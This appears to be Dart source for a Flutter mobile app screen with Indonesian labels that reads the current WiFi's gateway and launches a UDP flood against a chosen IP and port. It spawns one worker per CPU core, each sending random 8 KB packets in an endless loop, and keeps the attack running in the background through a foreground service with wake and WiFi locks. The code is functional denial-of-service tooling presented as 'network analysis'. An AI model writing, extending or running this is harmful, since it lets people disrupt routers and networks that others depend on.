import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'dart:isolate';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'theme.dart';

void _startFloodIsolate(Map<String, dynamic> args) {
  final SendPort sendPort = args['sendPort'];
  final String targetIp = args['targetIp'];
  final int targetPort = args['targetPort'];
  final int payloadSize = args['payloadSize'];
  final int workers = args['workers'];

  for (int i = 0; i < workers; i++) {
    Isolate.run(() async {
      try {
        final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
        socket.broadcastEnabled = true;
        final payload = List<int>.generate(payloadSize, (_) => Random().nextInt(256));
        int sent = 0;

        while (true) {
          try {
            socket.send(payload, InternetAddress(targetIp), targetPort);
            sent++;
            if (sent % 5000 == 0) {
              sendPort.send({'type': 'progress', 'count': 5000});
              sent = 0;
            }
          } catch (e) {
            sendPort.send({'type': 'error', 'msg': e.toString()});
            break;
          }
          await Future.delayed(const Duration(microseconds: 10));
        }
      } catch (e) {
        sendPort.send({'type': 'error', 'msg': e.toString()});
      }
    });
  }
}

class WifiExternalPage extends StatefulWidget {
  const WifiExternalPage({super.key});

  @override
  State<WifiExternalPage> createState() => _WifiExternalPageState();
}

class _WifiExternalPageState extends State<WifiExternalPage> {
  String ssid = '-';
  String ip = '-';
  String gateway = '-';
  bool isKilling = false;
  int totalSent = 0;
  String? errorMsg;
  String currentTarget = '';

  final TextEditingController _targetCtrl = TextEditingController();
  final TextEditingController _portCtrl = TextEditingController(text: '53');

  ReceivePort? _mainReceivePort;
  Isolate? _mainIsolate;
  Timer? _timerCount;

  @override
  void initState() {
    super.initState();
    FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
        channelId: 'vokra_flood',
        channelName: 'Vokra Background Service',
        channelDescription: 'Vokra sedang mengirim paket.',
        channelImportance: NotificationChannelImportance.LOW,
      ),
      iosNotificationOptions: const IOSNotificationOptions(),
      foregroundTaskOptions: ForegroundTaskOptions(
        eventAction: ForegroundTaskEventAction.nothing(),
        autoRunOnBoot: false,
        allowWakeLock: true,
        allowWifiLock: true,
      ),
    );
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _alert('Permission Denied', 'Akses lokasi diperlukan untuk membaca info WiFi.');
      return;
    }
    // Minta izin notifikasi (Android 13+)
    await Permission.notification.request();

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gw = await info.getWifiGatewayIP();

      final cleanSsid = name?.replaceAll('"', '');
      if (!mounted) return;
      setState(() {
        ssid = cleanSsid ?? '-';
        ip = ipAddr ?? '-';
        gateway = gw ?? '-';
        _targetCtrl.text = gw ?? '';
      });
    } catch (_) {
      if (!mounted) return;
      setState(() {
        ssid = ip = gateway = 'Error';
      });
    }
  }

  void _startFlood() async {
    final target = _targetCtrl.text.trim();
    final portStr = _portCtrl.text.trim();

    if (target.isEmpty) {
      _alert('Error', 'Target IP kosong.');
      return;
    }
    final port = int.tryParse(portStr);
    if (port == null || port < 1 || port > 65535) {
      _alert('Error', 'Port harus 1-65535.');
      return;
    }
    final parsed = InternetAddress.tryParse(target);
    if (parsed == null) {
      _alert('Error', 'Format IP tidak valid.');
      return;
    }

    setState(() {
      isKilling = true;
      errorMsg = null;
      totalSent = 0;
      currentTarget = '$target:$port';
    });

    // 1. Jalankan Foreground Service
    await FlutterForegroundTask.startService(
      notificationTitle: 'Vokra Running',
      notificationText: 'Target: $currentTarget',
    );

    // 2. Mulai Isolate
    _mainReceivePort = ReceivePort();
    _mainReceivePort!.listen((msg) {
      if (!mounted) return;
      if (msg['type'] == 'progress') {
        setState(() => totalSent += (msg['count'] as int));
      } else if (msg['type'] == 'error') {
        setState(() => errorMsg = msg['msg']);
        _stopFlood();
      }
    });

    final workers = Platform.numberOfProcessors;
    _startFloodIsolate({
      'sendPort': _mainReceivePort!.sendPort,
      'targetIp': target,
      'targetPort': port,
      'payloadSize': 8192, // 8KB lebih efisien dari 65KB (hindari fragmentasi)
      'workers': workers,
    });

    // 3. Auto refresh UI counter
    _timerCount = Timer.periodic(const Duration(seconds: 1), (_) {
      if (!mounted) return;
      setState(() {}); // trigger rebuild
    });
  }

  void _stopFlood() async {
    if (!mounted) return;
    setState(() => isKilling = false);
    
    _timerCount?.cancel();
    _timerCount = null;

    _mainReceivePort?.close();
    _mainReceivePort = null;
    _mainIsolate?.kill(priority: Isolate.immediate);
    _mainIsolate = null;

    await FlutterForegroundTask.stopService();
  }

  void _alert(String title, String message) {
    if (!mounted) return;
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: VokraTheme.surfaceDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(VokraTheme.rLg),
          side: const BorderSide(color: VokraTheme.hairline),
        ),
        title: Text(title, style: VokraTheme.displaySm.copyWith(color: VokraTheme.onDark)),
        content: Text(message, style: VokraTheme.bodySm.copyWith(color: VokraTheme.onDarkSoft)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('OK', style: VokraTheme.button.copyWith(color: VokraTheme.primary)),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 10),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(width: 96, child: Text(label, style: VokraTheme.captionUpper)),
          Expanded(child: Text(value, style: VokraTheme.bodySm.copyWith(color: VokraTheme.ink))),
        ],
      ),
    );
  }

  Widget _label(String text) => Padding(
        padding: const EdgeInsets.only(bottom: 6),
        child: Text(text, style: VokraTheme.captionUpper),
      );

  InputDecoration _inputDeco(String hint) => InputDecoration(
        hintText: hint,
        hintStyle: VokraTheme.bodySm.copyWith(color: VokraTheme.mutedSoft),
        filled: true,
        fillColor: VokraTheme.canvas,
        contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(VokraTheme.rMd),
          borderSide: const BorderSide(color: VokraTheme.hairline),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(VokraTheme.rMd),
          borderSide: const BorderSide(color: VokraTheme.primary, width: 1.5),
        ),
      );

  @override
  void dispose() {
    _stopFlood();
    _targetCtrl.dispose();
    _portCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: VokraTheme.canvas,
      appBar: AppBar(
        title: Text('LOCAL NETWORK', style: VokraTheme.displaySm),
        backgroundColor: VokraTheme.canvas,
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.fromLTRB(24, 8, 24, 32),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                width: double.infinity,
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: VokraTheme.surfaceDark,
                  borderRadius: BorderRadius.circular(VokraTheme.rLg),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('NETWORK ANALYSIS', style: VokraTheme.displayMd.copyWith(color: VokraTheme.onDark)),
                    const SizedBox(height: 8),
                    Text(
                      'Baca jaringan WiFi yang sedang tersambung dan kirim flood UDP ke target IP.',
                      style: VokraTheme.bodySm.copyWith(color: VokraTheme.onDarkSoft),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: VokraTheme.surfaceCard,
                  borderRadius: BorderRadius.circular(VokraTheme.rLg),
                  border: Border.all(color: VokraTheme.hairlineSoft),
                ),
                child: Column(
                  children: [
                    _infoRow('SSID', ssid),
                    const Divider(height: 1),
                    _infoRow('IP', ip),
                    const Divider(height: 1),
                    _infoRow('GATEWAY', gateway),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              Row(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Expanded(
                    flex: 3,
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        _label('TARGET IP'),
                        TextField(
                          controller: _targetCtrl,
                          keyboardType: TextInputType.numberWithOptions(decimal: true),
                          inputFormatters: [FilteringTextInputFormatter.allow(RegExp(r'[0-9.]'))],
                          style: VokraTheme.bodySm.copyWith(color: VokraTheme.ink),
                          decoration: _inputDeco('192.168.1.1'),
                          enabled: !isKilling,
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    flex: 2,
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        _label('PORT'),
                        TextField(
                          controller: _portCtrl,
                          keyboardType: TextInputType.number,
                          inputFormatters: [FilteringTextInputFormatter.digitsOnly],
                          style: VokraTheme.bodySm.copyWith(color: VokraTheme.ink),
                          decoration: _inputDeco('53'),
                          enabled: !isKilling,
                        ),
                      ],
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 20),

              ElevatedButton.icon(
                onPressed: isKilling ? _stopFlood : _startFlood,
                icon: Icon(isKilling ? Icons.stop : Icons.wifi_off, size: 18),
                label: Text(isKilling ? 'STOP' : 'START'),
              ),

              if (isKilling || totalSent > 0) ...[
                const SizedBox(height: 20),
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: VokraTheme.surfaceDark,
                    borderRadius: BorderRadius.circular(VokraTheme.rMd),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          if (isKilling)
                            const SizedBox(
                              width: 14, height: 14,
                              child: CircularProgressIndicator(strokeWidth: 2, color: VokraTheme.onDark),
                            ),
                          const SizedBox(width: 12),
                          Text(isKilling ? 'FLOODING...' : 'STOPPED',
                              style: VokraTheme.captionUpper.copyWith(color: VokraTheme.onDark)),
                        ],
                      ),
                      const SizedBox(height: 12),
                      Text('Sent: $totalSent packets',
                          style: VokraTheme.code.copyWith(color: VokraTheme.primary)),
                      if (errorMsg != null) ...[
                        const SizedBox(height: 8),
                        Text('Error: $errorMsg',
                            style: VokraTheme.code.copyWith(color: VokraTheme.error, fontSize: 11)),
                      ]
                    ],
                  ),
                ),
              ],

              const SizedBox(height: 32),
              Text(
                'Flood berjalan di background. Aplikasi boleh di-minimize.',
                style: VokraTheme.caption.copyWith(color: VokraTheme.muted),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
